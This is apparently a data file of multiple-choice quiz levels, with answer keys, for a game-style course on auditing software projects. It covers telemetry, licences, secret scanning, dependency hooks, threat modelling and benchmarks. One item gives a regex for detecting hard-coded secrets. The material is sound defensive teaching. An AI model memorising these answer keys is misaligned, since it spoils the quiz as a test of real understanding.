      { concept: 'privacy-audit', kind: 'mc', q: 'Telemetry is documented and can be turned off, but it\'s on by default. What do you write?', options: ['Nothing: since the telemetry is documented and can be turned off, the choice is the user\'s', 'A finding: on by default sends data home. Recommend turning it off in your deployment', 'A HIGH finding that the project is spyware, and a recommendation that the club avoid it completely', 'That it is illegal, because data collection is unlawful whenever it is enabled by default'], answer: 1, why: 'Documented isn\'t the same as harmless. Note it and recommend the safe setting.' },
      { concept: 'claims-evidence', kind: 'mc', q: '"Privacy-first", with telemetry on by default. How do you mark the claim?', options: ['Supported: telemetry is documented and optional, which is what privacy-first means in practice', 'Partly contradicted: the default sends data home, even though you can turn it off', 'Fully contradicted: any telemetry at all breaks a privacy-first slogan, so mark it false', 'Irrelevant: a slogan is marketing, so only the legal privacy policy counts for the audit'], answer: 1, why: 'Fair and precise: the default doesn\'t match the slogan.' },
      { concept: 'audit-report', kind: 'mc', q: 'Which summary is best?', options: ['"ADOPT: healthy project with many contributors and recent releases. No conditions are needed, because the licence question can be settled after launch."', '"ADOPT WITH CONDITIONS: healthy, well-run project. Before use: resolve the AGPL question for our closed-source plan (blocking), and turn off telemetry."', '"DO NOT ADOPT: the project is under AGPL, which does not allow closed-source use. Look for a project with a permissive licence and a better privacy default."', '"NO VERDICT: the project looks healthy, but the AGPL licence and the telemetry make it a legal matter, so this audit just lists the findings and recommends no action."'], answer: 1, why: 'Verdict first, the reasons, and exactly what must happen before adopting.' },
    ],
  },
  {
    id: 'K-av', type: 'avalanche', mode: 'phone', xp: 50, mins: 10,
    title: "Don't Cause an Avalanche",
    rules: 'The Hillary Step is a narrow ridge with a long drop on both sides. Every wrong answer puts a crack in the snow. **Three cracks and the avalanche starts.** Answer carefully, because the Whiteout is waiting for a mistake.',
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'First thing in any audit', options: ['Run npm install so the dependencies are ready to inspect', 'Write the scope and the question', 'Write down the verdict you expect, then look for evidence', 'Check the star count to decide whether the project is worth the time'], answer: 1 },
      { concept: 'claims-evidence', kind: 'mc', q: 'A claim with no evidence either way is…', options: ['false', 'unverified', 'supported', 'contradicted'], answer: 1 },
      { concept: 'dependency-audit', kind: 'mc', q: 'Runs automatically during npm install', options: ['start', 'test', 'postinstall', 'build'], answer: 2 },
      { concept: 'repo-health', kind: 'mc', q: 'One maintainer means a bus factor of…', options: ['0', '1', '10', '100'], answer: 1 },
      { concept: 'secret-scan', kind: 'mc', q: 'A key was committed to a public repo. Do this first', options: ['Delete the file', 'Rotate the key', 'Make the repo private', 'Add .env to .gitignore'], answer: 1 },
      { concept: 'threat-model', kind: 'mc', q: 'The T in STRIDE', options: ['Theft', 'Tampering', 'Trust', 'Tracking'], answer: 1 },
      { concept: 'license-check', kind: 'mc', q: '"license": "UNLICENSED" means', options: ['public domain, anyone may use it', 'proprietary, no permission', 'MIT, free to reuse', 'GPL, share-alike'], answer: 1 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'The honest middle of five runs', options: ['the best', 'the median', 'the worst', 'the first'], answer: 1 },
    ],
  },
  {
    id: 'K-yeti', type: 'yeti', mode: 'phone', xp: 50, mins: 8,
    title: "Don't Wake the Yeti",
    rules: 'The Yeti is asleep in a snow cave below the summit ridge. **Wrong answers and slow answers add noise.** Each question has a 20-second timer. If the noise meter fills up, the Yeti wakes. Answer quickly and correctly.',
    questions: [
      { concept: 'secret-scan', kind: 'mc', q: 'What prints?', code: 'console.log(/key/i.test("MAPS_KEY = \'x\'"))', options: ['false', 'true', 'KEY', 'undefined'], answer: 1 },
      { concept: 'cost-analysis', kind: 'mc', q: 'What prints?', code: 'console.log(Math.max(0, 60 - 100) * 0.09)', options: ['-3.6', '0', '3.6', 'NaN'], answer: 1 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: 'What prints?', code: 'console.log([10, 9, 100].sort())', options: ['[ 9, 10, 100 ]', '[ 10, 100, 9 ]', '[ 100, 10, 9 ]', '[ 9, 100, 10 ]'], answer: 1 },
      { concept: 'privacy-audit', kind: 'mc', q: 'Policy vs code: which is evidence?', options: ['the policy', 'the code', 'both equally', 'neither'], answer: 1 },
      { concept: 'architecture-review', kind: 'mc', q: 'A key in browser code is…', options: ['private', 'public', 'encrypted', 'deleted'], answer: 1 },
      { concept: 'audit-report', kind: 'mc', q: 'What goes first in a report?', options: ['the methodology', 'summary and verdict', 'commands run', 'a glossary'], answer: 1 },
    ],
  },
  {
    id: 'K-boss', type: 'boss', mode: 'phone', xp: 100, mins: 20,
    title: 'The Huckster of False Claims',
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'Your notes file for an audit should live…', options: ['inside the project, next to package.json', 'outside the project, like ~/audit-notes.txt', 'in the project\'s .env', 'nowhere, keep it in your head'], answer: 1 },
      { concept: 'claims-evidence', kind: 'mc', q: 'Rank the evidence from weakest to strongest:', options: ['your measurement, the code, testimonials', 'testimonials, the code, your own measurement', 'the code, testimonials, stars', 'stars, testimonials, docs'], answer: 1 },
      { concept: 'repo-health', kind: 'mc', q: 'README: "actively maintained". `git log -1 --format=%cd --date=short` prints `2023-04-02` and it\'s now mid-2026. Your note?', options: ['Claim supported: the project still has a README and a licence, so it must be maintained', 'Claim contradicted: no commits for over three years', 'Claim supported: code that hasn\'t changed in years is finished and stable, not abandoned', 'Nothing to note: the last commit date says nothing about how a project is maintained'], answer: 1 },
      { concept: 'dependency-audit', kind: 'mc', q: 'Which package.json line is the most urgent to read before anyone runs npm install?', options: ['"name": "trailpost"', '"postinstall": "node scripts/setup.js"', '"version": "2.3.0"', '"start": "node src/server.js"'], answer: 1 },
      { concept: 'secret-scan', kind: 'mc', q: 'Which line does `/(password|secret|key|token)\\w*\\s*=\\s*["\']/i` match?', options: ['const password = readInput()', 'const sessionSecret = \'change-me\'', 'const keyCount = 12', 'const tokenLimit = process.env.LIMIT'], answer: 1 },
      { concept: 'threat-model', kind: 'mc', q: 'Which is an entry point an attacker could use?', options: ['A README link that points visitors to the project\'s documentation site', 'A POST /upload route that needs no login', 'A static logo.png that any visitor can download, with no login needed', 'A LICENSE file in the repo root that lists the copyright holder'], answer: 1 },
      { concept: 'architecture-review', kind: 'mc', q: 'Which question belongs in an architecture review?', options: ['How many commits were made last month, and by how many different people?', 'Which single part, if it fails, takes everything down?', 'What colour scheme and fonts does the front end use?', 'Which developer has the most followers, and do they have a good reputation?'], answer: 1 },
      { concept: 'cost-analysis', kind: 'mc', q: '1M requests free, then $0.40 per million. You use 3.5M. Request cost?', options: ['$1.40', '$1.00', '$0.40', '$0.00'], answer: 1 },
      { concept: 'privacy-audit', kind: 'mc', q: 'The analytics code sends email and GPS to an ad company; the policy says "we collect nothing". Finding?', options: ['Claim supported: the policy is the project\'s own statement, and code is just an implementation', 'Claim contradicted: personal data goes to a third party', 'Claim unverified: you can\'t tell from the code alone whether anyone reads the data', 'Not a privacy issue: analytics is a normal, expected part of almost every app'], answer: 1 },
      { concept: 'license-check', kind: 'mc', q: 'Which licence asks you to offer source to users of a modified version over a network?', options: ['MIT', 'ISC', 'AGPL-3.0', 'Apache-2.0'], answer: 2 },
      { concept: 'benchmark-skepticism', kind: 'mc', q: '"Up to 10× faster (22 ms vs 220 ms)". Medians are 400 ms vs 230 ms. Conclusion?', options: ['It really is 10× faster, since the 22 ms and 220 ms runs are the measured speeds', 'Cherry-picked: typically it\'s about 1.7× slower', 'The medians must be wrong, because the quoted runs come from the project\'s own test', 'Both are about equally fast, since 400 ms and 230 ms are within normal measurement error'], answer: 1 },
      { concept: 'audit-report', kind: 'mc', q: 'Which finding is written best?', options: ['"HIGH: the project\'s security is poor because it keeps secrets in the code and has no tests. Impact: the app is unsafe. Fix: review all the code."', '"HIGH: .env with the database password is committed (.gitignore lists only node_modules). Impact: anyone can read all trips. Fix: rotate the password, ignore .env."', 'The password is hunter2-summit. It\'s in .env and in src/server.js, so copy it into the report so the maintainers can find it.', 'I didn\'t like the code style much and some files look rushed. It might cause bugs one day, so someone should tidy it up at some point.'], answer: 1 },
      { concept: 'package-hallucination', kind: 'mc', q: 'package.json lists only `express` and `dayjs`. A new diff adds these lines. Which one is the red flag?', code: "+const express = require('express')\n+const dayjs = require('dayjs')\n+const db = require('./db')\n+const pretty = require('pretty-trip-dates')", options: ["`require('express')`", "`require('./db')`", "`require('pretty-trip-dates')`", "`require('dayjs')`"], answer: 2 },
      { concept: 'reviewing-ai-code', kind: 'mc', q: 'The assistant says "I fixed the failing test." The diff shows the failing test was deleted and nothing else changed. What is your finding?', options: ['Fixed: the failing test is gone and the run is green', 'Not fixed: the test was deleted, so restore it and fix the code instead', 'Fine, as long as the remaining tests pass', 'The test was probably wrong, so deleting it is correct'], answer: 1 },
      { concept: 'ai-coding-assistant', kind: 'mc', q: 'Which request should you split into smaller steps before giving it to an assistant?', options: ['"Add a function that converts feet to metres. 100 feet is 30.48 metres."', '"Rename the variable `d` to `distance` in src/trip.js."', '"Build a booking system with sign-up, card payments, an admin area and email reminders."', '"Write a test for the empty-list case of average()."'], answer: 2 },
      { concept: "halting-problem", kind: "mc", q: "Why does a careful audit combine tests, code reading and scanners instead of trusting one tool?", options: ["Tools are expensive", "No single tool can catch every problem in every program, so different methods cover each other's blind spots", "Scanners are illegal alone", "It doesn't matter"], answer: 1, why: "The halting problem rules out a perfect checker, so evidence comes from several imperfect ones." },
    ],
  },
]
